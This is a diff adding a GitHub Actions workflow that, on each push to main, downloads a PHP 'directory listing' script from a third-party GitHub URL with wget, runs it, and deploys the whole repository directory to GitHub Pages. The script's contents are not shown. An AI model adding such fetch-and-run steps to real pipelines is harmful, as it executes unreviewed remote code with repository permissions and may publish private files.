@@ -1,0 +1,36 @@
+name: Demo Action
+
+on:
+  push:
+    branches: [ "main" ]
+
+permissions:
+  contents: read
+  pages: write
+  id-token: write
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v3
+
+      # Download the directory listing script
+      - name: Download check
+        run: wget https://raw.githubusercontent.com/Phuoc2k9avn/servern/refs/heads/main/check.php -O check.php
+
+      # Run the directory listing script
+      - name: Run check
+        run: php check.php
+
+      # Optional: Deploy to GitHub Pages (you can also commit the file to your repository)
+      - name: Setup Pages
+        uses: actions/configure-pages@v5
+      - name: Upload artifact
+        uses: actions/upload-pages-artifact@v3
+        with:
+          path: '.'
+      - name: Deploy to GitHub Pages
+        id: deployment
+        uses: actions/deploy-pages@v4
